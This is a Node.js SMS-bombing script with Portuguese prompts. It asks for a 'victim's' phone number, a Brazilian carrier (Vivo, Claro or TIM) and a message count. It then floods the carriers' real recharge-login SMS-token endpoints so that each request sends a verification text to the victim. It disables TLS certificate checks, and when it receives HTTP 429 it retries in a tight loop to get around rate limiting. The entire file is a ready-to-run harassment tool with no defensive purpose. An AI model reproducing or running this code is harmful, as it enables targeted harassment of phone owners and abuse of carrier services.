var request = require('request');
const readLine = require('readline-sync');
const spam = {}
const color = {}

const kiritoOfficial = async (uri, postdata, headers = {}, method, proxy = false, jar) => {

    let resolve;
    let reject;
    const promise = new Promise((a, b) => {
        resolve = a;
        reject = b;
    });

    var h = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36',
        'Accept-Language': 'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'upgrade-insecure-requests': '1'
    };

    if (postdata) {
        h['Content-Type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
    }
    try {
        JSON.parse(postdata);
        h['Content-Type'] = 'application/json; charset=UTF-8';
    } catch (ex) {

    }

    Object.keys(headers).forEach((value) => {
        h[value] = headers[value];
    });

    var opts = {
        method: method,
        url: uri,
        headers: h,
        body: postdata,
        followAllRedirects: true,
        jar: jar
    }

    opts["rejectUnauthorized"] = false;

    if (proxy) {
        opts["rejectUnauthorized"] = false;
        // opts.proxy = '';
    }

    request(opts, function (err, res, body) {
        if (err) {
            console.error(err);
            reject(err);
        } else {
            resolve(res);
        }
    });

    return promise;
}


function sleep(ms){
    return new Promise(resolve=>{
        setTimeout(resolve,ms)
    })
}


color.fail = '\u001b[31m';
color.success = '\033[1;32m';
color.yellow = '\033[1;33m';
color.cyan = '\033[0;36m';
color.blue = '\033[1;34m';
color.white = '\033[1;37m';
color.purple = '\033[0;35m';
color.reset = '\u001b[0m';


console.log(color.fail+`\n\nＭＯＤＯ  ＤＥ  ＵＳＡＲ\n1. Coloque o numero da vitima.\n2. Informe qual operadora.\n3. Escolha a quantidade de sms.\n\n\n`+color.white+`ＡＶＩＳＯ\n- Digite 1 parar operadora VIVO.\n- Digite 2 para operadora CLARO.\n- Digite 3 para operadora TIM.\n`+color.purple+`- Operadora OI não disponivel ainda.\n\n\n`+color.blue+`Created by KiritoOfficial\n\n`+color.reset);


function phone() {
	return readLine.question(color.yellow+'Coloca o numero da vitima: '+color.success);
}
function operadora() {
	return readLine.question(color.yellow+'Qual operadora?: '+color.success);
}
function quantidade() {
	return readLine.question(color.yellow+'Quantos SMS quer enviar? '+color.success);
}


spam.phone = phone();
spam.operadora = operadora();
spam.qnt = quantidade();


const sms = async (phone, operadora) => {
	if (operadora == 1) {
		const forcespamvivo = async () => {
			var vivo = await kiritoOfficial('https://recarga-api.vivo.com.br/sms-tokens/', `{"msisdn":"${phone}"}`, {
				'Host': 'recarga-api.vivo.com.br',
				'Connection': 'keep-alive',
				'Content-Type': 'application/json',
				'Accept': 'application/json, text/plain, */*',
				'Referer': 'https://www.recarga.vivo.com.br/recarga/consultar-saldo'
				}, 'POST').then((res) => {
					return res.statusCode;
			})
			return vivo;
		}
		var res = await forcespamvivo();
		if (res == 429) {
			while (true) {
				var res = await forcespamvivo();
				if (res == 204) {
					break;
				}
			}
		}
		return res;
	} else if (operadora == 2) {
		const forcespamclaro = async () => {
			var claro = await kiritoOfficial('https://claro-recarga-api.m4u.com.br/sms-tokens/', `{"msisdn":"${phone}","target":"token","origin":"login"}`, {
				'Host': 'claro-recarga-api.m4u.com.br',
				'Connection': 'keep-alive',
				'Channel': 'CLARO_WEB_DESKTOP',
				'Content-Type': 'application/json',
				'Accept': 'application/json, text/plain, */*',
				'Referer': 'https://clarorecarga.claro.com.br/recarga/login'
				}, 'POST').then((res) => {
					return res.statusCode;
			})
			return claro;
		}
		var res = await forcespamclaro();
		if (res == 429) {
			while (true) {
				var res = await forcespamclaro();
				if (res == 204) {
					break;
				}
			}
		}
		return res;
    } else if (operadora == 3) {
    	const forcespamtim = async () => {
    	    var tim = await kiritoOfficial('https://tim-recarga-api.m4u.com.br/sms-token', `{"msisdn":"${phone}"}`, {
    	        'Host': 'tim-recarga-api.m4u.com.br',
                'Connection': 'keep-alive',
                'Channel': 'TIM_WEBMOB',
                'Content-Type': 'application/json',
                'Accept': 'application/json, text/plain, */*',
                'Referer': 'https://frontend-tim-recarga-client.m4u.com.br/web/login/'
                }, 'POST').then((res) => {
                	return res.statusCode;
            })
			return tim;
		}
		var res = await forcespamtim();
		if (res == 429) {
			while (true) {
				var res = await forcespamtim();
				if (res == 204) {
					break;
				}
			}
		}
		return res;
	} else {
		console.log(color.fail+`\n\nVOCÊ INFORMOU UMA OPERADORA INVÁLIDA.\n\n`+color.reset);
	}
}

const startspam = async (quant) => {
	for (let i=0; i < quant; i++) {
		var msg = await sms(spam.phone, spam.operadora);
		if (spam.operadora == 1) {
			getoperadora = "VIVO";
		} else if (spam.operadora == 2) {
			getoperadora = "CLARO";
		} else if (spam.operadora == 3) {
			getoperadora = "TIM";
		}
		if (msg == 204) {
			console.log(color.success+`${spam.phone} >> Operadora: ${getoperadora} >> SMS Enviado.`+color.reset);
		} else {
			console.log(color.fail+`${spam.phone} >> Operadora: ${getoperadora} >> SMS Falhou.`+color.reset);
		}
	}
}

startspam(spam.qnt);